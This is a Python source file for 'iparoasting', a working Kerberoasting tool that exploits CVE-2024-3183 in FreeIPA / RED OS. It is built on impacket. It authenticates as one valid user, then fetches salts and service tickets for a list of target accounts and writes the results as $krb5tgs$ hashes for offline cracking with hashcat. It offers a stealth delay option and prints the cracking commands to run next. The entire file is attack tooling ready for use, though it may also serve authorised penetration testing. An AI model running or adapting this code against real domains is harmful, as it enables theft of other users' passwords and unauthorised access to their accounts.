#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import datetime
import getpass
import json
import logging
import os
import struct
import sys
import time
from binascii import hexlify
from typing import Any

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket.krb5 import constants
from impacket.krb5.asn1 import (AS_REQ, AS_REP, TGS_REP, KRB_ERROR,
                                KERB_PA_PAC_REQUEST, METHOD_DATA, ETYPE_INFO2,
                                seq_set, seq_set_iter)
from impacket.krb5.kerberosv5 import (getKerberosTGT, getKerberosTGS,
                                      sendReceive, KerberosError)
from impacket.krb5.types import KerberosTime, Principal

# Etypes offered in the salt-probe AS-REQ
# (KDC replies with etype-info2 for the principal's keys)
PROBE_ETYPES = (18, 17, 23)
# hashcat modes per ticket etype
HASHCAT_MODES = {17: 19600, 18: 19700, 23: 13100}
# default hash output file
DEFAULT_OUT = 'hashes.txt'

### pseudonyms
# etype -> (salt, s2kparams) as returned by Kerberos.parse_etype_info2()
SaltInfo = dict[int, tuple[bytes, bytes | None]]
# per-target ticket data as returned by Kerberos.capture_tgs()
Ticket = dict[str, Any]


def params_to_iterations(params: bytes | None) -> int:
    if params and len(params) == 4:
        return struct.unpack('>L', params)[0]
    return 4096  # RFC 3962 default, same as impacket uses


class Kerberos:
    """A class for working with Kerberos tickets"""
    # TODO: add nt-hash support

    def __init__(self, domain: str, user: str, password: str,
                 kdc: str | None) -> None:
        self._domain = domain.upper()  # realm, uppercase
        self._user = user
        self._password = password
        self._kdc = kdc
        self._auth_principal = Principal(
            user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        # TGT state, filled lazily by _ensure_tgt() — only needed for the
        # TGS-REQ fallback, which MIT KDC deployments rarely reach
        self._tgt: bytes | None = None
        self._cipher: Any = None
        self._session_key: Any = None

    def authenticate(self) -> tuple[bytes, Any, Any, Any]:
        """AS-REQ with preauth -> TGT. Caches the result in self and
        returns (tgt, cipher, key, sessionKey)."""
        self._tgt, self._cipher, _, self._session_key = getKerberosTGT(
            self._auth_principal, self._password, self._domain,
            b'', b'', '', self._kdc)
        return self._tgt, self._cipher, _, self._session_key

    def _ensure_tgt(self) -> None:
        """Fetch the TGT on first use. Most runs (AS-REQ path works) never
        need it, saving 2 network round trips and a KDC log entry."""
        if self._tgt is None:
            print('[*] Acquiring TGT for the TGS-REQ fallback...')
            self.authenticate()
            print('[+] TGT received')

    def _ticket_fields(self, ticket_asn1: Any) -> Ticket:
        """etype/kvno/cipher/sname from a ticket ASN.1 structure (enc-part is
        encrypted with the TARGET principal's key — the offline cracking
        material)."""
        enc = ticket_asn1['enc-part']
        etype = int(enc['etype'])
        cipher_bytes = enc['cipher'].asOctets()
        try:
            kvno = int(enc['kvno']) if enc['kvno'].hasValue() else None
        except Exception:
            kvno = None

        spn = Principal()
        spn.from_asn1(ticket_asn1, 'realm', 'sname')
        return {
            'etype': etype,
            'kvno': kvno,
            'cipher': cipher_bytes,
            'sname': str(spn),
        }

    def parse_etype_info2(self, reply: bytes) -> SaltInfo:
        """Parses the KDC reply (KRB-ERROR with PREAUTH_REQUIRED, or AS-REP
        when the principal has no preauth) into
        {etype: (salt: bytes, s2kparams: bytes | None)}."""
        methods = None
        try:
            krb_err = decoder.decode(reply, asn1Spec=KRB_ERROR())[0]
            edata = krb_err['e-data'].asOctets()
            methods = decoder.decode(edata, asn1Spec=METHOD_DATA())[0]
        except Exception:
            # Not a KRB-ERROR: maybe an AS-REP (no preauth for the principal)
            try:
                as_rep = decoder.decode(reply, asn1Spec=AS_REP())[0]
                methods = as_rep['padata']
            except Exception:
                pass

        result: SaltInfo = {}
        if methods is None:
            return result

        for method in methods:
            if method['padata-type'] == int(
                    constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value):
                try:
                    entries = decoder.decode(method['padata-value'],
                                             asn1Spec=ETYPE_INFO2())[0]
                except Exception:
                    continue
                for entry in entries:
                    try:
                        etype = int(entry['etype'])
                        try:
                            salt = (entry['salt'].asOctets()
                                    if entry['salt'].hasValue() else b'')
                        except Exception:
                            salt = b''
                        try:
                            params = (
                                entry['s2kparams'].asOctets()
                                if entry['s2kparams'].hasValue() else None)
                        except Exception:
                            params = None
                        result[etype] = (salt, params)
                    except Exception:
                        continue
        return result

    def _build_salt_probe(self, user: str) -> bytes:
        """AS-REQ without preauth: the KDC must answer KRB-ERROR
        PREAUTH_REQUIRED carrying PA-ETYPE-INFO2 with the target principal's
        salt and s2kparams."""
        as_req = AS_REQ()
        as_req['pvno'] = 5
        as_req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        pac_request = KERB_PA_PAC_REQUEST()
        pac_request['include-pac'] = False
        as_req['padata'] = noValue
        as_req['padata'][0] = noValue
        as_req['padata'][0]['padata-type'] = int(
            constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        as_req['padata'][0]['padata-value'] = encoder.encode(pac_request)

        cname = Principal(user,
                          type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        sname = Principal(f'krbtgt/{self._domain}',
                          type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        req_body = seq_set(as_req, 'req-body')
        opts = [
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.proxiable.value,
        ]
        req_body['kdc-options'] = constants.encodeFlags(opts)

        seq_set(req_body, 'sname', sname.components_to_asn1)
        seq_set(req_body, 'cname', cname.components_to_asn1)
        req_body['realm'] = self._domain
        now = datetime.datetime.now(datetime.timezone.utc) \
            + datetime.timedelta(days=1)
        req_body['till'] = KerberosTime.to_asn1(now)
        req_body['rtime'] = KerberosTime.to_asn1(now)
        req_body['nonce'] = int.from_bytes(os.urandom(4), 'big') & 0x7fffffff
        seq_set_iter(req_body, 'etype', PROBE_ETYPES)

        return encoder.encode(as_req)

    def fetch_salts(self, user: str) -> tuple[SaltInfo, str, str]:
        """Returns ({etype: (salt, params)}, kind, message) where kind is
        'ok' | 'unknown' | 'disabled' | 'error'."""
        probe = self._build_salt_probe(user)
        try:
            reply = sendReceive(probe, self._domain, self._kdc)
        except KerberosError as e:
            code = e.getErrorCode()
            if code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                return {}, 'unknown', \
                    'user not found (KDC_ERR_C_PRINCIPAL_UNKNOWN)'
            if code == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value:
                return {}, 'disabled', \
                    'account blocked (KDC_ERR_CLIENT_REVOKED)'
            return {}, 'error', f'KDC: {e}'
        except Exception as e:
            return {}, 'error', f'network/KDC unavailable: {e}'

        info = self.parse_etype_info2(reply)
        if not info:
            return {}, 'error', \
                'KDC did not return PA-ETYPE-INFO2 (no preauth?)'
        return info, 'ok', ''

    # error codes that mean OUR credentials are bad: nothing will work,
    # so capture_tgs re-raises them instead of trying the fallback
    FATAL_CRED_ERRORS = (
        constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value,
        constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value,
        constants.ErrorCodes.KDC_ERR_KEY_EXPIRED.value,
        constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value,
    )

    def capture_tgs(self, spn: str) -> Ticket:
        """Ticket for the TARGET principal, two methods:

        Method 1 (primary, as in the CVE-2024-3183 PoC): AS-REQ by the
        authenticated user with sname = <target>.

        Method 2 (fallback): classic TGS-REQ via TGT, obtained lazily by
        _ensure_tgt() on first need. May be rejected by MIT KDCs
        (KRB_AP_ERR_INAPP_CKSUM).

        Raises KerberosError if our own credentials turn out to be bad;
        RuntimeError with both error chains if neither path succeeds.
        """
        errors: list[str] = []
        server_name = Principal(
            spn, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # Method 1: AS-REQ with sname = target user
        if self._auth_principal is not None and self._password is not None:
            try:
                reply, _, _, _ = getKerberosTGT(
                    self._auth_principal, self._password, self._domain,
                    b'', b'', '', self._kdc, serverName=server_name)
                as_rep = decoder.decode(reply, asn1Spec=AS_REP())[0]
                res = self._ticket_fields(as_rep['ticket'])
                res['method'] = f'AS-REQ (sname={spn})'
                return res
            except KerberosError as e:
                if e.getErrorCode() in self.FATAL_CRED_ERRORS:
                    raise  # our credentials are bad — abort the whole run
                errors.append(f'AS: {e}')
            except Exception as e:
                errors.append(f'AS: {e}')

        # Method 2: TGS-REQ via TGT (fetched lazily on first use)
        try:
            self._ensure_tgt()
            reply, _, _, _ = getKerberosTGS(
                server_name, self._domain, self._kdc,
                self._tgt, self._cipher, self._session_key)
            tgs = decoder.decode(reply, asn1Spec=TGS_REP())[0]
            res = self._ticket_fields(tgs['ticket'])
            res['method'] = 'TGS-REQ'
            return res
        except KerberosError as e:
            if e.getErrorCode() in self.FATAL_CRED_ERRORS:
                raise
            errors.append(f'TGS: {e}')
        except Exception as e:
            errors.append(f'TGS: {e}')

        raise RuntimeError(' | '.join(errors))


class HashWriter:
    """Writes hashes to the main file and, in parallel, to per-mode files
    (19700/19600/13100) so each file can be fed straight to hashcat."""

    def __init__(self, out_path: str) -> None:
        self.out_path = out_path
        self.base, self.ext = os.path.splitext(out_path)
        self.counts: dict[int, int] = {}   # hashcat mode -> hash count

    def _mode_path(self, mode: int) -> str:
        return f"{self.base}_{mode}{self.ext or '.txt'}"

    def add(self, user_f: str, realm_f: str, etype: int,
            cipher: bytes) -> int | None:
        line = self.make_hashcat_line(user_f, realm_f, etype, cipher)
        mode = HASHCAT_MODES.get(etype)
        with open(self.out_path, 'a') as f:
            f.write(line + '\n')
        if mode:
            with open(self._mode_path(mode), 'a') as f:
                f.write(line + '\n')
            self.counts[mode] = self.counts.get(mode, 0) + 1
        return mode

    def summary(self) -> str:
        """Ready-to-copy hashcat commands per non-empty per-mode file."""
        if not self.counts:
            return 'no hashes collected'
        if len(self.counts) == 1:
            mode = next(iter(self.counts))
            return f"hashcat -m {mode} {self.out_path} <wordlist>"
        lines = []
        for mode, n in sorted(self.counts.items()):
            cmd = f"hashcat -m {mode} {self._mode_path(mode)} <wordlist>"
            lines.append(f"{cmd}   # {n} hash.")
        return '\n    '.join(lines)

    def make_hashcat_line(self, user_f: str, realm_f: str, etype: int,
                          cipher: bytes) -> str:
        """Save the hashes in hashcat.txt line by line. There are three types
        of lines:
        - etype 17/18: '$krb5tgs$<e>$<user_f>$<realm_f>$<mac12>$<edata>' the
          format has NO salt field.
        - etype 23 (RC4): MAC (16 bytes, MD5) is at the start of the cipher."""
        if etype == 23:
            chk = hexlify(cipher[:16]).decode()
            rest = hexlify(cipher[16:]).decode()
            return f'$krb5tgs$23$*{user_f}${realm_f}$*${chk}${rest}'
        chk = hexlify(cipher[-12:]).decode()
        rest = hexlify(cipher[:-12]).decode()
        return f'$krb5tgs${etype}${user_f}${realm_f}${chk}${rest}'

    def make_hashcat_fields(self, realm: str, user: str,
                            salt: bytes) -> tuple[str, str, bool]:
        """There is no salt field in the hashcat format, so this method
        handles three cases to build the realm_f and user_f fields:

        1. Standard salt (REALM + login): the fields become the real
           login and realm, UPPER(realm_f) + user_f matches the salt as is.
        2. Arbitrary salt: the salt is split at the first lowercase letter;
           the case-invariant prefix becomes realm_f, the remainder becomes
           user_f, so UPPER(realm_f) + user_f equals the salt.
        3. Salt containing '$' (the hashcat format separator) or starting
           with a lowercase letter: it cannot be packed into the fields,
           a ValueError is raised.
        """
        try:
            salt_s = salt.decode('utf-8')
        except Exception:
            raise ValueError('salt is not a UTF-8 string')

        if salt_s == realm.upper() + user:
            return user, realm, False

        if '$' in salt_s:
            raise ValueError(
                "salt contains '$' — a field delimiter for hashcat")

        # TODO: review this code
        # position of the first lowercase letter:
        # everything before it is invariant to UPPER()
        p = next((i for i, ch in enumerate(salt_s) if ch.upper() != ch),
                 len(salt_s))
        if p == 0:
            raise ValueError(
                'The salt starts with a lowercase letter — an empty realm '
                "field hashcat doesn't accept")
        if p == len(salt_s):
            # The entire string is case-invariant: split at len-1/1
            # so that both parts are non-empty.
            if len(salt_s) < 2:
                raise ValueError('The salt is too short to be broken '
                                 'down into fields.')
            p = len(salt_s) - 1
        realm_f, user_f = salt_s[:p], salt_s[p:]
        if realm_f.upper() + user_f != salt_s or not user_f:
            raise ValueError('Failed to distribute the salt across '
                             'the realm/user fields')
        return user_f, realm_f, True

    def _artifact_hashcat_line(self, user: str, realm: str,
                               target: Ticket) -> str | None:
        """hashcat line for the JSON artifact (or None if the salt cannot
        be packed)."""
        try:
            user_f, realm_f, _ = self.make_hashcat_fields(realm, user,
                                                          target['salt'])
            return self.make_hashcat_line(user_f, realm_f, target['etype'],
                                          target['cipher'])
        except ValueError:
            return None

    def save_artifact(self, save_dir: str, user: str, realm: str,
                      target: Ticket) -> str:
        os.makedirs(save_dir, exist_ok=True)
        path = os.path.join(save_dir, f'{user}.json')
        data = {
            'tool': 'iparoasting',
            'user': user,
            'realm': realm,
            'etype': target['etype'],
            'kvno': target['kvno'],
            'salt': target['salt'].decode('utf-8', 'replace'),
            's2kparams_hex': (hexlify(target['params']).decode()
                              if target['params'] else None),
            'iterations': target['iterations'],
            'cipher_hex': target['cipher'].hex(),
            'sname': target.get('sname'),
            'method': target.get('method'),
            'hashcat': self._artifact_hashcat_line(user, realm, target),
            'obtained': datetime.datetime.now().isoformat(timespec='seconds'),
        }
        with open(path, 'w') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return path


def load_targets(args: argparse.Namespace) -> list[str]:
    """Target list: positional args or file."""
    users = list(args.users)
    if args.users_file:
        with open(args.users_file) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if '@' in line:
                    name, _, r = line.partition('@')
                    if r.upper() == args.domain.upper():
                        line = name
                users.append(line)
    seen: set[str] = set()
    result: list[str] = []
    for u in users:
        u = u.strip()
        if u and u.lower() not in seen:
            seen.add(u.lower())
            result.append(u)
    return result


def fatal_auth_error(e: KerberosError) -> str:
    code = e.getErrorCode()
    ec = constants.ErrorCodes
    hints = {
        ec.KDC_ERR_PREAUTH_FAILED.value: 'incorrect password',
        ec.KDC_ERR_C_PRINCIPAL_UNKNOWN.value: 'user does not exist',
        ec.KDC_ERR_KEY_EXPIRED.value: 'account password has expired',
        ec.KDC_ERR_MORE_PREAUTH_DATA_REQUIRED.value:
            'KDC requires additional preauth (SPAKE/FAST/OTP), '
            'not supported by impacket',
        ec.KDC_ERR_PADATA_TYPE_NOSUPP.value:
            'KDC rejected our preauth type (see --debug)',
        ec.KDC_ERR_PREAUTH_BAD_AUTHENTICATION_SET.value:
            'KDC requires a different preauth set (see --debug)',
    }
    return hints.get(code) or str(e)


def main() -> None:
    parser = argparse.ArgumentParser(
        description='Kerberoasting hash harvester for FreeIPA / RED OS '
                    '(CVE-2024-3183): authenticate -> salt + ticket per '
                    'target -> $krb5tgs$ hashes into a file for hashcat.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='Examples:\n'
               '  %(prog)s -d test.local.corp -u valid_user -p Pass '
               '--kdc-ip 10.0.0.1 -U users.txt -o hashes.txt\n'
               '  hashcat -m 19700 hashes.txt rockyou.txt\n')

    net = parser.add_argument_group('network (harvest hashes)')
    net.add_argument('-d', '--domain',
                     help='domain realm, e.g. test.local.corp')
    net.add_argument(
        '--kdc-ip',
        help='IP/FQDN of the KDC (else resolved via the domain)')
    net.add_argument('-u', '--username',
                     help='login of a valid account for authentication')
    net.add_argument('-p', '--password',
                     help='password (asked interactively if omitted)')
    net.add_argument('--sleep', type=float, default=0.0, metavar='SEC',
                     help='pause between targets, sec (stealth, default 0)')

    targets = parser.add_argument_group('targets')
    targets.add_argument('users', nargs='*', metavar='USER',
                         help='target logins (or SPNs)')
    targets.add_argument('-U', '--users-file',
                         help='file with logins (one per line)')
    targets.add_argument(
        '--salt-format', default='{realm}{user}', metavar='FMT',
        help='fallback salt if the KDC gave none: {realm} {user} '
             '(default {realm}{user}, the MIT/FreeIPA standard)')

    out = parser.add_argument_group('output')
    out.add_argument(
        '-o', '--out', default=DEFAULT_OUT, metavar='FILE',
        help='hashcat hash file (default %(default)s); with mixed etypes, '
             'per-mode files <base>_<mode>.txt are also written')
    out.add_argument(
        '--save-dir', metavar='DIR',
        help='directory for JSON artifacts (salt/etype/cipher/hashcat line)')

    misc = parser.add_argument_group('misc')
    misc.add_argument('--debug', action='store_true',
                      help='impacket debug output')
    args = parser.parse_args()

    if args.debug:
        logging.basicConfig(level=logging.DEBUG)

    if not args.domain or not args.username:
        parser.error('-d/--domain and -u/--username are required')
    if not args.users and not args.users_file:
        parser.error('no targets: positional USER and/or -U/--users-file')

    realm = args.domain.upper()
    password = args.password
    if password is None:
        password = getpass.getpass(f'Password {args.username}@{realm}: ')

    # 1. The Kerberos client; the TGT is NOT fetched here — method 1 of
    #    capture_tgs authenticates per target, and the TGT for the fallback
    #    is acquired lazily only if method 1 ever fails
    print(f'[*] Authentication: {args.username}@{realm} '
          f'(KDC: {args.kdc_ip or realm})')

    krb = Kerberos(domain=realm, user=args.username,
                   password=password, kdc=args.kdc_ip)

    users = load_targets(args)
    print(f'[*] Targets: {len(users)} | output: {args.out}\n')

    writer = HashWriter(args.out)
    results: list[tuple[str, str]] = []  # (user, note)
    for idx, user in enumerate(users, 1):
        print(f'[{idx}/{len(users)}] {user}@{realm}')

        # 2a. Salt & string-to-key params from PA-ETYPE-INFO2
        info, kind, msg = krb.fetch_salts(user)
        if kind != 'ok':
            print(f'      [-] Skipped: {msg}')
            results.append((user, msg))
            continue

        # 2b. Ticket for the target principal
        #     (AS-REQ with sname=target, TGS-REQ fallback)
        try:
            t = krb.capture_tgs(spn=user)
        except KerberosError as e:
            # our own credentials are bad — nothing will work, abort
            sys.exit(f'[-] Authentication error: {fatal_auth_error(e)}')
        except Exception as e:
            msg = f'ticket: {e}'
            print(f'      [-] {msg}')
            results.append((user, msg))
            continue

        # 2c. Pick the salt matching the ticket's etype
        etype = t['etype']
        if etype == 23:
            salt, params = b'', None
        else:
            salt, params = info.get(etype, (None, None))
            if salt is None:
                salt = args.salt_format.format(
                    realm=realm, user=user).encode('utf-8')
                print(f'      [!] KDC gave no salt for etype {etype}, '
                      f'using fallback: {salt!r}')
        t['salt'] = salt
        t['params'] = params
        t['iterations'] = params_to_iterations(params)

        print(f"      [+] Ticket ({t.get('method', '?')}): etype={etype} "
              f"kvno={t['kvno']} cipher={len(t['cipher'])} bytes | "
              f"salt={salt!r}")
        if t['iterations'] != 4096:
            # non-default PBKDF2 iteration count: worth showing (and it also
            # means hashcat's fixed 4096 will not crack this hash)
            print(f"      [!] Non-default PBKDF2 iterations: "
                  f"{t['iterations']} (hashcat modes 19600/19700 assume 4096)")

        # 3. Hash into file(s) for hashcat
        if etype == 23:
            user_f, realm_f, custom = user, realm, False
        else:
            try:
                user_f, realm_f, custom = writer.make_hashcat_fields(
                    realm, user, salt)
            except ValueError as e:
                # happens extremely rarely (salt with '$' or starting
                # with a lowercase letter)
                print(f'      [!] {e} — hash not written to file')
                results.append(
                    (user, f'harvested (etype {etype}, '
                           'salt not hashcat-compatible)'))
                if args.save_dir:
                    path = writer.save_artifact(args.save_dir, user, realm, t)
                    print(f'      [+] Artifact: {path}')
                if args.sleep > 0 and idx < len(users):
                    time.sleep(args.sleep)
                continue
        mode = writer.add(user_f, realm_f, etype, t['cipher'])
        print(f'      [+] Hashes: {args.out} (supported mode {mode})')
        if custom:
            salt_s = salt.decode('utf-8', 'replace')
            print(f"          line: $krb5tgs${etype}${salt_s}")
        suffix = ', salt packed into fields' if custom else ''
        note = f'harvested (etype {etype}{suffix})'

        # JSON artifact
        if args.save_dir:
            path = writer.save_artifact(args.save_dir, user, realm, t)
            print(f'      [+] Artifact: {path}')

        results.append((user, note))

        if args.sleep > 0 and idx < len(users):
            time.sleep(args.sleep)

    # Summary
    print('\n' + '=' * 64)
    print(f"{'USER':<25} STATUS")
    print('-' * 64)
    for user, note in results:
        print(f'{user:<25} {note}')
    print('=' * 64)
    print(f"[*] Next step:\n    {writer.summary()}")


if __name__ == '__main__':
    main()
